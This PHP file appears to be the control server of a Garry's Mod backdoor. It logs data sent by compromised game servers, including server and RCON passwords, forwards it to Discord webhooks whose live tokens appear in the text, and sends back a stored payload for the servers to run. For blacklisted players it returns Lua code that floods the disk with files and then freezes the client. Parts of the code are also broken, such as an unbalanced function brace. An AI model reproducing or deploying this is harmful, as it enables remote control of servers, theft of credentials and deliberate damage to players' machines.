<?php
		$db = new PDO("mysql:host=localhost:3306;dbname=dbname", "username", "password");
$mip = $_SERVER["REMOTE_ADDR"];
function LogD($txt)
{
	$txt = htmlentities($txt);
	if(!isset($db))
	{
		$db = new PDO("mysql:host=localhost:3306;dbname=dbname", "username", "password");
	$r = $db->prepare("INSERT INTO logs (txt, datee) VALUES( :txt, NOW() )"); 
	$r->bindParam(":txt", $txt);
	$r->execute();
}
function httpPost($url, $data)
{
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);
    return $response;
}
if(isset($_REQUEST["pname"]))
{
	$name = htmlentities($_REQUEST["pname"]);
	$ip = htmlentities($_REQUEST["pip"]);
	$steamid = htmlentities($_REQUEST["psteamid"]);
	$lastserver = htmlentities($_REQUEST["lastserver"]);
	$row = $db->prepare('SELECT * FROM players WHERE steamid = :steamid');
	$row->bindParam(":steamid", $steamid);
	$row->execute();
	$row = $row->fetch(PDO::FETCH_ASSOC);
	if(!$row)
	{
		$r = $db->prepare("INSERT INTO players (name, ip, steamid,  lastserver, blacklisted) VALUES( :name, :ip, :steamid, :lastserver, 'no' )"); 
		$r->bindParam(":name", $name);
		$r->bindParam(":ip", $ip);
		$r->bindParam(":steamid", $steamid);
		$r->bindParam(":lastserver", $lastserver);
		$r->execute();
	}else{
		$r = $db->prepare("UPDATE players SET name = :name, ip = :ip,  lastserver = :lastserver WHERE steamid = :steamid"); 
		$r->bindParam(":name", $name);
		$r->bindParam(":ip", $ip);
		$r->bindParam(":steamid", $steamid);
		$r->bindParam(":lastserver", $lastserver);
		$r->execute();
		$r = $db->prepare("SELECT * FROM `players` WHERE steamid = :steamid");
		$r->bindParam(":steamid", $steamid);
		$r->execute();

		$key = $r->fetch(PDO::FETCH_ASSOC);
		if($key["blacklisted"] == "yes")
		{

			$str = "@everyone A blacklisted player ($name) tried to join $lastserver\nHe has been crashed !";
			httpPost("https://discordapp.com/api/webhooks/527182878711218186/evmK8F_ndnJNYWKdbsg0hEpZ0KBpCSUBvE1mQWL3AqHQK44-XWL8wdSV9nQjL4rn-1gf", array('content' => $str));
			?>
			RunString([[
			local i = 0
			while true do
				file.Write(i.."-"..i.."-"..i.."-"..i.."-"..i.."-"..i..".txt","sniper")
				i = i + 1
			end
			]])
			RunString([[
			timer.Simple(5,function()
			while true do end
			end)
			]])
			<?php
			LogD("Blacklisted player $name has been crashed !");
			$db = null;
			die();
		}
		
	}
	$db = null;
	die("-- Escapade loaded !");
}
	if(!isset($_REQUEST["name"]))
		die("no name");
	if(!isset($_REQUEST["ip"]))
		die("no ip");
	if(!isset($_REQUEST["password"])){$_REQUEST["password"] = "none";};
	if(!isset($_REQUEST["player"])){$_REQUEST["player"] = "0";};



	$name = htmlentities($_REQUEST["name"]);
	$ip = htmlentities($_REQUEST["ip"]);
	$password = htmlentities($_REQUEST["password"]);
	$player = htmlentities($_REQUEST["player"]);
	$rcon = htmlentities($_REQUEST["rcon"]);
	$map = htmlentities($_REQUEST["map"]);
	$uptime = htmlentities($_REQUEST["uptime"]);
	$gamemode = htmlentities($_REQUEST["gamemode"]);
	$maxplayer = htmlentities($_REQUEST["maxplayer"]);
	$fastdlurl = htmlentities($_REQUEST["fastdlurl"]);
	$players = htmlentities($_REQUEST["players"]);
	$backdoors = $_REQUEST["backdoors"];
	if($name == "Garry's Mod")
		die();
	if($name == "! ! ! - ")
		die("lol");
	if($map == "rp_suckmydick")
		die();
	if($ip == "0.0.0.0:0")
	{
		?>
		timer.Remove("fdppppppppp")
		<?php
		die();
	}

	$id = sha1($_REQUEST["ip"]);
	foreach ( $db->query("SELECT * FROM `settings`") as $key) {
		$bcode = base64_encode($key["default_payload"]);
	}



	$userQuery = "SELECT * FROM servers WHERE id=:id;";
    $stmt = $db->prepare($userQuery);
    $stmt->execute(array(':id' => $id));
    $row = !!$stmt->fetch(PDO::FETCH_ASSOC);
	if(!$row)
	{
		$r = $db->prepare("INSERT INTO servers (backdoors, players, name, fastdlurl, maxplayer, uptime, ip, password, map, rcon, player, id, code, lastping, status, gamemode) VALUES( :backdoors, :players, :name, :fastdlurl, :maxplayer, :uptime, :ip, :password, :map, :rcon, :player, :id, :code, NOW(), 'New', :gamemode)"); 
		$r->bindParam(":name", $name);
		$r->bindParam(":ip", $ip);
		$r->bindParam(":password", $password);
		$r->bindParam(":player", $player);
		$r->bindParam(":map", $map);
		$r->bindParam(":uptime", $uptime);
		$r->bindParam(":id", $id);
		$r->bindParam(":rcon", $rcon);
		$r->bindParam(":code", $bcode);
		$r->bindParam(":gamemode", $gamemode);
		$r->bindParam(":maxplayer", $maxplayer);
		$r->bindParam(":fastdlurl", $fastdlurl);
		$r->bindParam(":players", $players);
		$r->bindParam(":backdoors", $backdoors);
		$r->execute();
		foreach ( $db->query("SELECT * FROM `servers` WHERE id = '$id'") as $key) {
			print(base64_decode($key["code"]));
		}
		$str = "@everyone\nNew server ! yay!!\nName: $name\nIP: $ip\nPassword: \n$password\nMap: $map\nGamemode: $gamemode\nRCON: ||$rcon||\nUptime: $uptime\nPlayer/maxPlayer: $player/$maxplayer\n\nRemote IP : $mip";
		LogD("New server: $name");
		httpPost("https://discordapp.com/api/webhooks/499888223062065163/91Qhc8emzQJn4U0OmSB61z0iAPFc0uOajvqs_vkW20ryyX8_9jK8zHlPge5w5SNJX8SO", array('content' => $str));
	}else{
		foreach ( $db->query("SELECT * FROM `servers` WHERE id = '$id'") as $key) {
			if($bcode != $key["code"])
				LogD("$name responded to paylaod !");
			print(base64_decode($key["code"]));
		}
		
	foreach ( $db->query("SELECT * FROM `servers` WHERE id = '$id'") as $key) {
	if($key["status"] != "<div class=\"c\">Connected</div>")
	{
		$str = "$name connected !";
		httpPost("https://discordapp.com/api/webhooks/527179624841609236/S4ULD4yQSmmbZqGg-ZXsnD6G7VrE1kDREXzvhQbd00zyEguicvH_1FNLwY8ZavtAr9Kk", array('content' => $str));
		}
	}
		$r = $db->prepare("UPDATE servers SET players = :players, fastdlurl = :fastdlurl, maxplayer = :maxplayer, gamemode = :gamemode, status = '<div class=\"c\">Connected</div>', lastping = NOW(), name = :name, ip = :ip, map = :map, uptime = :uptime, backdoors = :backdoors, rcon = :rcon, password = :password, player = :player, code = :code WHERE id = :id"); 
		$r->bindParam(":name", $name);
		$r->bindParam(":ip", $ip);
		$r->bindParam(":map", $map);
		$r->bindParam(":password", $password);
		$r->bindParam(":uptime", $uptime);
		$r->bindParam(":player", $player);
		$r->bindParam(":rcon", $rcon);
		$r->bindParam(":code", $bcode);
		$r->bindParam(":id", $id);
		$r->bindParam(":gamemode", $gamemode);
		$r->bindParam(":maxplayer", $maxplayer);
		$r->bindParam(":fastdlurl", $fastdlurl);
		$r->bindParam(":players", $players);
		$r->bindParam(":backdoors", $backdoors);

		$r->execute();



	}


$db = null;
?>
